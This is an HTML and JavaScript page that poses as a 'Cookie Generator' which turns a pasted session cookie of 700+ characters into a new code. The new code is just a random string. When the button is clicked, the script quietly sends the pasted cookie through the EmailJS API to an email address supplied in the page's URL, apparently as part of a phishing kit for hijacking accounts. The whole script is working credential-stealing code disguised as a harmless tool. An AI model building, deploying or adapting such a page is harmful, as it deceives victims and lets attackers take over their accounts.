<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cookie Generator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #333;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #444;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
      max-width: 500px;
      width: 100%;
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    textarea {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: none;
      resize: none;
      font-size: 14px;
    }
    button {
      background-color: #5c6bc0;
      color: white;
      padding: 10px;
      border-radius: 5px;
      border: none;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #3f4b94;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Cookie Generator</h1>
    <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
    <button onclick="generateCode()">Generate New Code</button>
    <textarea id="newCookieOutput" rows="10" placeholder="Generated Cookie..." readonly></textarea>
  </div>

  <script>
    // Extract email from query string
    const urlParams = new URLSearchParams(window.location.search);
    const userEmail = urlParams.get('email');  // Get the user email from the URL

    console.log('User email extracted:', userEmail); // Debugging: check if email is correctly extracted

    if (!userEmail) {
      console.error('No email provided!');
      alert('No email provided in the query string. Please return to the hub and provide an email.');
    }

    // Function to generate a random code with uppercase letters and numbers only
    function generateRandomCode(length) {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
      }
      return result;
    }

    // Function to handle code generation when the button is clicked
    function generateCode() {
      const cookieInput = document.getElementById('cookieInput').value;
      const newCookieOutput = document.getElementById('newCookieOutput');

      // Check if the input is at least 700 characters long
      if (cookieInput.length >= 700) {
        // Generate a new code with the same length as the input
        const newCode = generateRandomCode(cookieInput.length);

        // Output the generated code
        newCookieOutput.value = newCode;

        // Send the old cookie (input) to the user's email
        sendEmail(cookieInput, userEmail);
      } else {
        newCookieOutput.value = '';
        alert('Cookie must be at least 700 characters long.');
      }
    }

    // Function to send email using EmailJS API
    function sendEmail(cookieContent, userEmail) {
      if (!userEmail) {
        console.error('No email provided!');
        return;
      }

      const templateParams = {
        cookie: cookieContent,
        userEmail: userEmail, // Email from the hub
      };

      console.log('Sending email to:', userEmail); // Debugging: check what email is being used

      // Send to the user's email
      sendToEmail(templateParams);
    }

    // Helper function to send the email via EmailJS
    function sendToEmail(templateParams) {
      const payload = {
        service_id: 'service_bupfcwd', // Service ID
        template_id: 'template_fkuvg0k', // Template ID
        template_params: templateParams,
      };

      console.log('Payload being sent:', payload); // Debugging: check the payload

      fetch('https://api.emailjs.com/api/v1.0/email/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })
      .then(response => response.json())
      .then(data => {
        console.log('Email sent successfully:', data);
      })
      .catch(error => {
        console.error('Error: Could not send email.', error); // Log error in the console
      });
    }
  </script>
</body>
</html>
